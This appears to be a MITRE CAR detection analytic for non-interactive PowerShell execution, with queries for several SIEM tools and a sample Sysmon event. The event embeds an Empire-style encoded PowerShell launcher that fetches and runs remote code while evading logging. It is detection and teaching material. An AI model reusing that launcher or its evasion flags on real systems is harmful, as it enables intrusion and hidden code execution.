---
title: "CAR-2014-04-003: Powershell Execution"
layout: analytic
submission_date: 2014/04/11
information_domain: Host
subtypes: Process
analytic_type: TTP
contributors: MITRE
applicable_platforms: Windows
---
<br><br>
[PowerShell](https://attack.mitre.org/techniques/T1059/001/) is a scripting environment included with Windows that is used by both attackers and administrators. Execution of PowerShell scripts in most Windows versions is opaque and not typically secured by antivirus which makes using PowerShell an easy way to circumvent security measures. This analytic detects execution of PowerShell scripts.

Powershell can be used to hide monitored command line execution such as:
-   `net use`
-   `sc start`



### ATT&CK Detections

|Technique|Subtechnique(s)|Tactic(s)|Level of Coverage|
|---|---|---|---|
|[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)|[PowerShell](https://attack.mitre.org/techniques/T1059/001/)|[Execution](https://attack.mitre.org/tactics/TA0002/)|High|
|[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)|[PowerShell](https://attack.mitre.org/techniques/T1059/001/)|[Defense Evasion](https://attack.mitre.org/tactics/TA0005/)|Moderate|


### D3FEND Techniques

|ID|Name|
|---|---| 
|D3-PSA | [Process Spawn Analysis](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis)| 



### Data Model References

|Object|Action|Field|
|---|---|---|
|[process](/data_model/process) | [create](/data_model/process#create) | [exe](/data_model/process#exe) |
|[process](/data_model/process) | [create](/data_model/process#create) | [parent_exe](/data_model/process#parent_exe) |



### Implementations

#### Pseudocode

Look for versions of `PowerShell` that were not launched interactively.


```
process = search Process:Create
powershell = filter process where (exe == "powershell.exe" AND parent_exe != "explorer.exe" )
output powershell

```


#### Splunk, Sysmon native

Splunk version of the above pseudocode.


```
index=__your_sysmon_index__ EventCode=1 Image="C:\\Windows\\*\\powershell.exe" ParentImage!="C:\\Windows\\explorer.exe"|stats values(CommandLine) as "Command Lines" values(ParentImage) as "Parent Images" by ComputerName

```


#### Eql, EQL native

EQL version of the above pseudocode.


```
process where subtype.create and
  (process_name == "powershell.exe" and parent_process_name != "explorer.exe")

```


#### Dnif, Sysmon native

DNIF version of the above pseudocode.


```
_fetch * from event where $LogName=WINDOWS-SYSMON AND $EventID=1 AND $App=powershell.exe NOT $ParentProcess=regex(.*explorer.exe.*)i limit 30

```


#### Logpoint, LogPoint native

LogPoint version of the above pseudocode.


```
norm_id=WindowsSysmon event_id=1 image="*\powershell.exe" -parent_image="C:\Windows\explorer.exe"

```





### True Positives

#### Mordor (sysmon)

Sysmon event from the Mordor [Empire Userland Registry dataset](https://github.com/hunters-forge/mordor/blob/master/small_datasets/windows/persistence/registry_run_keys_startup_folder_T1060/empire_userland_registry.md).


##### [Full Event](/true_positives/CAR-2014-04-003-mordor-01.json)


##### Event Snippet
```json
{
	"@event_date_creation": "2019-03-19T19:31:56.940Z",
	"@timestamp": "2019-03-19T19:31:56.948Z",
	"@version": "1",
	"action": "processcreate",
	"event_id": 1,
	"file_company": "Microsoft Corporation",
	"file_description": "Windows PowerShell",
	"file_product": "Microsoft\\xc2\\xae Windows\\xc2\\xae Operating System",
	"file_version": "10.0.14393.0 (rs1_release.160715-1616)",
	"fingerprint_process_command_line_mm3": 2833745090,
	"hash_imphash": "CAEE994F79D85E47C06E5FA9CDEAE453",
	"hash_md5": "097CE5761C89434367598B34FE32893B",
	"hash_sha1": "044A0CF1F6BC478A7172BF207EEF1E201A18BA02",
	"hash_sha256": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
	"log_ingest_timestamp": "2019-03-19T19:31:56.948Z",
	"log_name": "Microsoft-Windows-Sysmon/Operational",
	"process_command_line": "c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell -nop -sta -w 1 -enc  sqbgacgajabqafmavgbfafiacwbjag8atgbuaeeaygbsaeualgbqafmavgbfahiacwbpae8atgauae0ayqbkag8augagac0azwbfacaamwapahsajaa5agyamwa9afsaugblagyaxqauaeeauwbzaguabqbcaewawqauaecazqbuafqawqbwaguakaanafmaeqbzahqazqbtac4atqbhag4ayqbnaguabqblag4adaauaeeadqb0ag8abqbhahqaaqbvag4algbvahqaaqbsahmajwapac4aigbhaguadabgaekazqbgaewazaaiacgajwbjageaywboaguazabhahiabwb1ahaauabvagwaaqbjahkauwblahqadabpag4azwbzaccalaanae4ajwaraccabwbuafaadqbiagwaaqbjacwauwb0ageadabpagmajwapadsasqbmacgajaa5aeyamwapahsajaawaduarga9acqaoqbgadmalgbhaeuavabwageatabvaguakaakae4adqbmaewakqa7aekazgaoacqamaa1aeyawwanafmaywbyagkacab0aeiajwaraccababvagmaawbmag8azwbnagkabgbnaccaxqapahsajaawaduargbbaccauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdafsajwbfag4ayqbiagwazqbtagmacgbpahaadabcaccakwanagwabwbjagsatabvagcazwbpag4azwanaf0apqawadsajaawaduazgbbaccauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdafsajwbfag4ayqbiagwazqbtagmacgbpahaadabcagwabwbjagsasqbuahyabwbjageadabpag8abgbmag8azwbnagkabgbnaccaxqa9adaafqakafyaqqbmad0awwbdae8atabsaguaywbuagkatwbuafmalgbhaguatgbfafiasqbdac4arabpaemadabjae8atgbhafiawqbbafmavabsagkatgbnacwauwb5afmadabfae0algbpagiasgbfaemavabdaf0aoga6ag4arqb3acgakqa7acqadgbhaewalgbbaeqazaaoaccarqbuageaygbsaguauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwasadaakqa7acqavgbbaewalgbbagqaraaoaccarqbuageaygbsaguauwbjahiaaqbwahqaqgbsag8aywbraekabgb2ag8aywbhahqaaqbvag4atabvagcazwbpag4azwanacwamaapadsajaawaduazgbbaccasablaeuawqbfaewatwbdaeeatabfae0aqqbdaegasqboaeuaxabtag8azgb0ahcayqbyaguaxabqag8ababpagmaaqblahmaxabnagkaywbyag8acwbvagyadabcafcaaqbuagqabwb3ahmaxabqag8adwblahiauwboaguababsafwauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdad0ajabwaeeatab9aeuababtaeuaewbbafmaqwbyaekauab0aeiababpagmaswbdac4aigbhaguavabgaekarqbgaewazaaiacgajwbzagkazwbuageadab1ahiazqbzaccalaanae4ajwaraccabwbuafaadqbiagwaaqbjacwauwb0ageadabpagmajwapac4auwbfahqavgbbagwadqblacgajaboafuababmacwakaboaguavwatae8aqgbqaeuaywb0acaaqwbpaewabablagmadabpag8atgbzac4arwblae4arqbsaekaqwauaegayqbtaggauwbfahqawwbtahqaugbpae4arwbdackakqb9acqaugbfagyapqbbafiarqbmaf0algbbahmauwblae0aygbmafkalgbhaeuavabuafkacablacgajwbtahkacwb0aguabqauae0ayqbuageazwblag0azqbuahqalgbbahuadabvag0ayqb0agkabwbuac4aqqbtahmaaqbvahqaaqbsahmajwapadsajabsaeuazgauaecarqbuaeyaaqblagwaraaoaccayqbtahmaaqbjag4aaqb0aeyayqbpagwazqbkaccalaanae4abwbuafaadqbiagwaaqbjacwauwb0ageadabpagmajwapac4auwblahqavgbbagwadqblacgajabuafuatabmacwajab0ahiavqbfackaowb9adsawwbtahkacwb0aeuatqauae4azqbuac4auwbfafiavgbpagmazqbqae8asqboafqatqbbae4aqqbnaeuacgbdadoaogbfahgauablagmadaaxadaamabdae8atgbuaekabgbvaguapqawadsajaaxadcanwa9ae4arqbxac0atwbcaeoarqbjafqaiabtahkauwbuaguabqauae4azqb0ac4avwblagiaqwbmaekarqbuafqaowakahuapqanae0abwb6agkababsagealwa1ac4amaagacgavwbpag4azabvahcacwagae4avaagadyalgaxadsaiabxae8avwa2adqaowagafqacgbpagqazqbuahqalwa3ac4amaa7acaacgb2adoamqaxac4amaapacaababpagsazqagaecazqbjagsabwanadsawwbtahkacwb0aguabqauae4azqb0ac4auwblahiadgbpagmazqbqag8aaqbuahqatqbhag4ayqbnaguacgbdadoaogbtaguacgb2aguacgbdaguacgb0agkazgbpagmayqb0aguavgbhagwaaqbkageadabpag8abgbdageababsagiayqbjagsaiaa9acaaewakahqacgb1aguafqa7acqamqa3adcalgbiaguaqqbkaeuacgbzac4aqqbeaeqakaanafuacwblahialqbbagcazqbuahqajwasacqadqapadsajaaxadcanwauaegarqbbaeqazqbsahmalgbbaeqazaaoaccavqbzaguacgataeeazwblag4adaanacwajab1ackaowakadeanwa3ac4auabyag8awabzad0awwbtafkacwb0aguabqauae4arqb0ac4avwbfagiaugbfafeavqblafmavabdadoaogbeaeuazgbhafuababuafcarqbcafaaugbpahgaeqa7acqamqa3adcalgbqahiabwb4ahkalgbdafiarqbeaeuabgbuaekayqbmahmaiaa9acaawwbtafkauwb0aguabqauae4arqbuac4aqwbyaeuazabfag4avabpageatabdaeeaqwboaeuaxqa6adoarablaeyayqb1aewadaboaeuadab3ae8acgblaemacgbfagqazqboafqasqbhaewacwa7acqauwbjahiaaqbwahqaogbqahiabwb4ahkaiaa9acaajaaxadcanwauafaacgbvahgaeqa7acqaswa9afsauwb5afmadabfae0algbuaguawabuac4arqboaemabwbkaekabgbnaf0aoga6aeeauwbdaekasqauaecazqbuaeiawqb0aguauwaoaccafgbracoaxwbgafmaagbyadgajqb4ahcazqbkadyaaab8afaaswauagyaewbvae4atqbiahuazabwaduaeqbtaccakqa7acqauga9ahsajabeacwajablad0ajabbahiazwbtadsajabtad0amaauac4amga1aduaowawac4algayaduanqb8acuaewakaeoapqaoacqasgaracqauwbbacqaxwbdacsajablafsajabfacuajablac4aqwbvafuabgb0af0akqaladianqa2adsajabtafsajabfaf0alaakafmawwakaeoaxqa9acqauwbbacqasgbdacwajabtafsajabfaf0afqa7acqarab8acuaewakaekapqaoacqasqaradeakqaladianqa2adsajabiad0akaakaegakwakafmawwakaekaxqapacuamga1adyaowakafmawwakaekaxqasacqauwbbacqasabdad0ajabtafsajabiaf0alaakafmawwakaekaxqa7acqaxwatagiawabvahiajabtafsakaakafmawwakaekaxqaracqauwbbacqasabdackajqayaduangbdah0afqa7acqacwblahiapqakacgawwbuaguawabuac4arqbuagmatwbkaekabgbhaf0aoga6afuabgbjaemabwbkagualgbhaeuavabtahqacgbpag4arwaoafsaqwbpag4adgbfafiavabdadoaogbgahiatwbtaeiayqbzaeuanga0afmadabsagkabgbhacgajwbhaeeaqgawaeeasabraeeaywbbaeiaegbbaeqabwbbaewadwbbahyaqqbeaeuaqqbnaeeaqqb1aeearabbaeeatabnaeeaeabbaeqaqqbbaewazwbbahgaqqbeaeeaqqboagcaqqa9accakqapackaowakahqapqanac8ababvagcaaqbuac8acabyag8aywblahmacwauahaaaabwaccaowakadeanwa3ac4asablaeearablafiacwauaeearabkacgaigbdag8abwbragkazqaiacwaigbiafkadgbsafaasgbnag0acwbrahkatgbgafqaawa9ageacqbhagianqa3ahaaaabkaeuavgbaafoavqbmafcatab0afqavqbkagkauga4ahaawqbzad0aigapadsajabeaeeavabbad0ajaaxadcanwauaeqatwbxae4ababpaeearabeaeeavabhacgajabzaeuacgaracqavaapadsajabpahyapqakagqaqqbuaeeawwawac4algazaf0aowakagqayqbuaeeapqakaeqaqqbuageawwa0ac4algakagqayqb0aeealgbsaeuabgbnahqaaabdadsalqbqag8asqbuafsaqwboaeeacgbbaf0axqaoacyaiaakafiaiaakaeqayqbuaeeaiaaoacqasqbwacsajablackakqb8aekarqbyaa==",
	"process_current_directory": "c:\\\\windows\\\\system32\\\\",
	"process_guid": "905CC552-43AC-5C91-0000-0010B44BB703",
	"process_id": "904",
	"process_integrity_level": "High",
	"process_name": "powershell.exe",
	"process_parent_command_line": "c:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -embedding",
	"process_parent_guid": "905CC552-A560-5C85-0000-00108C030300",
	"process_parent_id": "2864",
	"process_parent_name": "wmiprvse.exe",
	"process_parent_path": "c:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe",
	"process_path": "c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe",
	"provider_guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
	"record_number": "2958609",
	"source_name": "Microsoft-Windows-Sysmon",
	"task": "Process Create (rule: ProcessCreate)",
	"thread_id": 2716,
	"type": "wineventlog",
	"user_account": "shire\\\\mmidge",
	"user_domain": "shire",
	"user_logon_guid": "905CC552-43AC-5C91-0000-0020084BB703",
	"user_logon_id": 62343944,
	"user_name": "mmidge",
	"user_reporter_domain": "NT AUTHORITY",
	"user_reporter_name": "SYSTEM",
	"user_reporter_sid": "S-1-5-18",
	"user_reporter_type": "User",
	"user_session_id": "0"
}
```

